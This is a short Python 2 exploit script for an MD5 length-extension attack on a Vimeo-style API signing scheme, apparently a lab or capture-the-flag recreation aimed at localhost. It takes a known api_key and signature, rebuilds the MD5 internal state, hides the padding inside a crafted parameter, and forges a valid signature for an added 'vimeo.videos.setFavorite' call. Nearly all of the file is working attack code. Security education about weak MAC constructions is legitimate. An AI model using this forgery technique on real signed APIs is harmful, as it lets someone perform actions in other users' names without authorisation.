import requests
import md5
import struct
import binascii

url = "http://localhost:4242/api"

def flatten(req):
  res = ""
  for k, v in sorted(req.items()):
    res += k
    res += v
  return res

def pad_md5(l):
  length = struct.pack('<Q', l * 8)
  padding = '\x80'
  padding += '\x00' * ((64 - len(length) - (l + 1) % 64) % 64)
  padding += length
  return padding

old_data = {
    'method': 'vimeo.test.login',
    'api_key': raw_input("api_key: "),
}

flattened_old = flatten(old_data)
old_length = len(flattened_old)
old_padding = pad_md5(old_length)
flattened_old += old_padding

# craft the packet we want
new_data = {
  'api_key': old_data['api_key'],
  'video_id': '1337',
  'favorite': '1',
  'method': 'vimeo.videos.setFavorite',
  flattened_old[0]: flattened_old[1:]
}

api_sig = raw_input("api_sig: ")

flattened_new = flatten(new_data)
flattened_new += pad_md5(old_length + len(old_padding) + len(flattened_new))

from md5 import MD5
md5 = MD5('')
md5.A, md5.B, md5.C, md5.D = struct.unpack('<IIII', binascii.unhexlify(api_sig))
while len(flattened_new):
    md5._handle(flattened_new[:64])
    flattened_new = flattened_new[64:]

new_data['api_sig'] = md5.hexdigest()

print new_data

r = requests.post(url, data=new_data)
print r.text
